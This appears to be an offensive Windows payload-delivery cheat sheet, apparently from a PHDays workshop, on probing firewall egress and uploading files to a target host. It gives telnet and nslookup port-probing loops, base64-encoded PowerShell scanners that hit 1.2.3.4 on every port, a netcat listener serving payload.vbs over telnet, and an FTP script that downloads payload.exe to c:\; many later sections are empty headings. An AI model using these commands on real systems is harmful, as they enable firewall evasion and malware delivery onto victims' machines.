WindowsUploadToolkit # PHDAYS |||
====================

###Agenda
[Firewall egress filtering](#egress-firewall)


##Firewall egress filtering

### Windows XP & 2003
####Check open TCP:
```
FOR /L %i IN (1,1,4096) DO (cmd /c "start /b telnet 1.2.3.4 %i")
```
####Check open UDP:
```
FOR /L %i IN (1,1,4096) DO (cmd /c "start /b nslookup -port=%i x.com 1.2.3.4")
```

### Windows Vista and Later

####Enable TelnetClient:
```
dism /online /enable-feature /featurename:TelnetClient
```
####Check open TCP:
```
powershell –encodedCommand ZnVuY3Rpb24gc1QoJElQLCRQb3J0KSB7JEFkZHJlc3MgPSBbc3lzdGVtLm5ldC5JUEFkZHJlc3NdOjpQYXJzZSgkSVApOyRFbmQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuSVBFbmRQb2ludCAkYWRkcmVzcywgJHBvcnQ7JFNhZGRyZiA9IFtTeXN0ZW0uTmV0LlNvY2tldHMuQWRkcmVzc0ZhbWlseV06OkludGVyTmV0d29yazskU3R5cGUgPSBbU3lzdGVtLk5ldC5Tb2NrZXRzLlNvY2tldFR5cGVdOjpTdHJlYW07JFB0eXBlID0gW1N5c3RlbS5OZXQuU29ja2V0cy5Qcm90b2NvbFR5cGVdOjpUQ1A7JFNvY2sgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5Tb2NrZXQgJHNhZGRyZiwgJHN0eXBlLCAkcHR5cGU7JFNvY2suVFRMID0gMjY7dHJ5IHsgJHNvY2suQ29ubmVjdCgkRW5kKTtbQnl0ZVtdXSAkTWVzc2FnZSA9IFtjaGFyW11dIncwMHR3MDB0IjskU2VudCA9ICRTb2NrLlNlbmQoJE1lc3NhZ2UpOyRzb2NrLkVuZENvbm5lY3QoJENvbm5lY3QpfSBjYXRjaCB7fTskU29jay5DbG9zZSgpO307MS4uNjU1MzUgfCAleyBzVCAtSVAgIjEuMi4zLjQiIC1Qb3J0ICRfIH0=
```

```
function sT($IP,$Port) {
$Address = [system.net.IPAddress]::Parse($IP)
$End = New-Object System.Net.IPEndPoint $address, $port
$Saddrf = [System.Net.Sockets.AddressFamily]::InterNetwork
$Stype = [System.Net.Sockets.SocketType]::Stream
$Ptype = [System.Net.Sockets.ProtocolType]::TCP
$Sock = New-Object System.Net.Sockets.Socket $saddrf, $stype, $ptype
$Sock.TTL = 26
try { 
  $sock.Connect($End)
  [Byte[]] $Message = [char[]]"w00tw00t“
	$Sent = $Sock.Send($Message)
	$sock.EndConnect($Connect)} catch {}
	$Sock.Close()
}

1..65535 | %{ sT -IP "1.2.3.4" -Port $_ };
```
####Check open UDP:
```
powershell –encodedCommand ZnVuY3Rpb24gc1UoJElQLCBbaW50XSRQb3J0KXskQWRkcmVzcyA9IFtzeXN0ZW0ubmV0LklQQWRkcmVzc106OlBhcnNlKCRJUCk7JEVuZCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5JUEVuZFBvaW50KCRBZGRyZXNzLCAkcG9ydCk7JFNhZGRyZj1bU3lzdGVtLk5ldC5Tb2NrZXRzLkFkZHJlc3NGYW1pbHldOjpJbnRlck5ldHdvcms7JFN0eXBlPVtTeXN0ZW0uTmV0LlNvY2tldHMuU29ja2V0VHlwZV06OkRncmFtOyRQdHlwZT1bU3lzdGVtLk5ldC5Tb2NrZXRzLlByb3RvY29sVHlwZV06OlVEUDskU29jaz1OZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5Tb2NrZXQgJHNhZGRyZiwgJHN0eXBlLCAkcHR5cGU7JFNvY2suVFRMID0gMjY7JHNvY2suQ29ubmVjdCgkZW5kKTskRW5jPVtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFTQ0lJOyRNZXNzYWdlID0gIncwMHR3MDB0IjskQnVmZmVyPSRFbmMuR2V0Qnl0ZXMoJE1lc3NhZ2UpOyRTZW50PSRTb2NrLlNlbmQoJEJ1ZmZlcik7fTsgMS4uNjU1MzUgfCAleyBzVSAtSVAgIjEuMi4zLjQiIC1Qb3J0ICRfIH0=
```
```
function sU($IP, [int]$Port){
$Address = [system.net.IPAddress]::Parse($IP)
$End = New-Object System.Net.IPEndPoint($Address, $port)
$Saddrf = [System.Net.Sockets.AddressFamily]::InterNetwork
$Stype = [System.Net.Sockets.SocketType]::Dgram
$Ptype = [System.Net.Sockets.ProtocolType]::UDP
$Sock = New-Object System.Net.Sockets.Socket $saddrf, $stype, $ptype
$Sock.TTL = 26
$sock.Connect($end)
$Enc = [System.Text.Encoding]::ASCII
$Message = "w00tw00t“
$Buffer = $Enc.GetBytes($Message)
$Sent = $Sock.Send($Buffer)
}

1..65535 | %{ sU -IP "1.2.3.4" -Port $_ }
```


##Telnet
####Server side
```
nc -q 20 -lvp 53 < payload.vbs
```
####Client side
```
mode CON COLS=2000 && telnet -f c:\payload.vbs 1.2.3.4 53
```

##FTP
####Server side
Start anonymous FTP
####Client side
Script file payload.txt:
```
open 1.2.3.4 3128
quote pasv
binary
get payload.exe c:\payload.exe
bye
```
##TFTP
####Server Side
####Client side

##Samba
####Server Side
####Client side

##WebDAV
####Server Side
####Client side

##VBScript/JScript
####Server Side
####Client side

##Windows Host Script
####Server Side
####Client side

##MSHTA
####Server Side
####Client side

##NSLOOKUP
####Server Side
####Client side

##PowerShell
####Server Side
####Client side

##Bitsadmin
####Server Side
####Client side
